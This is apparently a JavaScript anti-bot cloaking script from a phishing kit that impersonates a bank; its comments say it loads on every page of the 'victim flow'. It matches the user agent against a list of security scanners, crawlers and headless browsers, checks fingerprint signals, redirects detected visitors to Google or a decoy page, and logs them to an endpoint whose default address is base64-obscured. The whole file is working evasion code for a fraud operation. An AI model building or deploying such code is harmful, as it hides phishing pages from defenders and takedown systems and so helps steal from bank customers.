// ============================================================
//  BOTS FILTER v2.0 — Filtro anti-bot en el navegador (Kit Mercantil)
//  Se incluye ANTES de config.js en cada pagina del flujo de victimas:
//    <script src="bots_filter.js"></script>
//  Lee bots_db.json del mismo directorio (si no esta, usa defaults
//  embebidos). Decide ANTES de que corra cualquier otro script.
// ============================================================
(function () {
  'use strict';

  // Defaults embebidos por si bots_db.json no esta disponible
  var DEFAULT_UA = [
    'python', 'requests', 'urllib', 'curl/', 'wget', 'go-http-client', 'java/', 'okhttp',
    'apache-httpclient', 'axios/', 'node-fetch', 'undici', 'scrapy', 'selenium', 'puppeteer',
    'playwright', 'headlesschrome', 'phantomjs', 'electron/', 'sqlmap', 'nikto', 'nessus',
    'masscan', 'nmap', 'gobuster', 'dirb', 'dirsearch', 'wpscan', 'zgrab', 'libwww-perl',
    'httpx', 'aiohttp', 'httrack', 'burp', 'postmanruntime', 'insomnia/', 'bot', 'crawler',
    'spider', 'scanner', 'facebookexternalhit', 'linkpreview', 'headless'
  ];
  var DEFAULT_BASE = 'aHR0cDovLzEyNy4wLjAuMTo4Nzg3';

  // Carga sincronica de bots_db.json: hay que decidir antes de que corra el resto
  var db = null;
  try {
    var x = new XMLHttpRequest();
    x.open('GET', 'bots_db.json', false);
    x.send(null);
    if (x.status === 200) db = JSON.parse(x.responseText);
  } catch (e) { /* sin db en el servidor: usar defaults */ }

  var cfg = (db && db.navegador) || {};
  var uas = (db && db.user_agents && db.user_agents.palabras) || DEFAULT_UA;
  var ua = navigator.userAgent || '';
  var l = ua.toLowerCase();

  function motivoBot() {
    var i, w;
    for (i = 0; i < uas.length; i++) {
      w = String(uas[i]).toLowerCase();
      if (w && l.indexOf(w) !== -1) return 'UA:' + uas[i];
    }
    if (cfg.webdriver_bloquear !== false && navigator.webdriver === true) return 'WEBDRIVER';
    if (window.screen && screen.width < (cfg.pantalla_min_ancho || 200)) return 'PANTALLA:' + screen.width;
    if (navigator.languages && navigator.languages.length === 0) return 'LANG_VACIO';
    if (/Chrome\//.test(ua) && !window.chrome) return 'CHROME_SIN_OBJETO';
    if (/Firefox\//.test(ua) && navigator.plugins && navigator.plugins.length === 0 && !window.mozInnerScreenX) return 'FIREFOX_HEADLESS';
    return null;
  }

  function actuar() {
    var url = (cfg.accion === 'google') ? 'https://www.google.com' : 'carga.html';
    try { window.stop(); } catch (e) {}
    try { location.replace(url); } catch (e) { window.location.href = url; }
  }

  function reportar(motivo) {
    if (cfg.reportar_visitas === false) return;
    try {
      var base = (db && db.firebase && db.firebase.base_url) || atob(DEFAULT_BASE);
      var path = String(window.location.hostname || 'local_test').replace(/[^a-zA-Z0-9]/g, '_') + '_s2x0';
      var k = 'b_' + Date.now() + '_' + Math.floor(Math.random() * 10000);
      var r = new XMLHttpRequest();
      r.open('PUT', base + '/visits/' + k + '.json', true);
      r.setRequestHeader('Content-Type', 'application/json');
      r.send(JSON.stringify({
        ruta: path,
        page: window.location.pathname,
        ua: ua,
        motivo: motivo,
        ts: Date.now()
      }));
    } catch (e) {}
  }

  var motivo = motivoBot();
  if (motivo) {
    reportar(motivo);
    actuar();
    // Freno de seguridad: impide que el resto de la pagina siga ejecutando
    // mientras la redireccion se completa (evita writes a Firebase).
    (function freno() { setTimeout(freno, 50); })();
    throw new Error('[bots_filter] bot detectado: ' + motivo);
  }
})();
